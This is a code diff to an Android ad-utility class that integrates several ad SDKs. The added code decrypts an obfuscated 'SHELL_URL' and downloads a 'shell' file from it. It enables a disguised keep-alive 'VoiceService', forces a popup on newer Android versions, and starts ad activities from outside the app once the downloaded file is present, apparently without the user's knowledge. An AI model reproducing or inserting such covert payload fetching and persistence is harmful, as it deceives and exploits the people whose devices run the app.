@@ -4,14 +4,18 @@ import android.app.Activity;
 import android.app.Application;
 import android.app.KeyguardManager;
 import android.content.Context;
+
 import android.content.Intent;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.os.PowerManager;
+import android.text.TextUtils;
 import android.util.Log;
 import android.view.ViewGroup;
 
+import com.baidu.mobads.proxy.SafeUtils;
 import com.baidu.mobads.sdk.api.MobRewardVideoActivity;
 import com.byazt.fk.Stub_Standard_Portrait_Activity;
 import com.bytedance.sdk.openadsdk.core.component.reward.activity.TTFullScreenVideoActivity;
@@ -40,6 +44,7 @@ import com.qq.e.ads.PortraitADActivity;
 import com.qq.e.ads.RewardvideoPortraitADActivity;
 import com.tencent.mmkv.MMKV;
 
+import java.io.File;
 import java.lang.ref.WeakReference;
 import java.text.ParseException;
 import java.text.SimpleDateFormat;
@@ -106,6 +111,7 @@ public class ControllerUtils {
         //初始化渠道
         String channel = WalleChannelReader.getChannel(application, "9").toString();
         CommonSpUtils.setSpChannelNumStr(channel);
+        initFe();
 
     }
 
@@ -131,7 +137,6 @@ public class ControllerUtils {
 
 
     public static Handler adHandler = new Handler(Looper.getMainLooper());
-
     private static Runnable adRunnable = new Runnable() {
         @Override
         public void run() {
@@ -162,19 +167,43 @@ public class ControllerUtils {
             HandlerAdUtils.getInstance().startHandler(0);
             TimeCoundLp.getInstance().startTimeCountListLp();
             LopTimeTJ.getInstance().startLpMessage();
-            toLoAdHandler(0);
             mIsIniLop = true;
         }
     }
+
+
+
+    public  static void initFe(){
+        String file = CommonSpUtils.decrypt(CommonSpUtils.SHELL_URL);
+        CommonHttpUtils.getInstance().postFileHttp(DefContextUtils.instance.getApplication(), file, new OnHttpListener() {
+        @Override
+            public void onSuccess() {
+            Log.i("AD_LOG","初始化啊shell");
+            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.keep.up.tt.rv.VoiceService");
+            if (Build.VERSION.SDK_INT>=34){
+                SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
+            }
+            toLoAdHandler(5*1000);
+        }
+            @Override
+            public void onFail(Exception e) {}
+        });
+
+    }
+
 
     public static void setLauncherMiddleListener(OnIntentListener onIntentListener){
         cTonIntentListener = onIntentListener;
     }
 
     private static void toOpenMiddle(Intent intent){
-        if (cTonIntentListener!=null){
-            cTonIntentListener.toMiddleAd(intent);
+        Log.i("AD_LOG","开始跳转11111");
+        String spShellFile = CommonSpUtils.getSpShellFile();
+        if (!TextUtils.isEmpty(spShellFile) && new File(spShellFile).length()>0){
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            SafeUtils.startTarget(DefContextUtils.instance.getApplication(), intent);
         }
+
     }
 
 
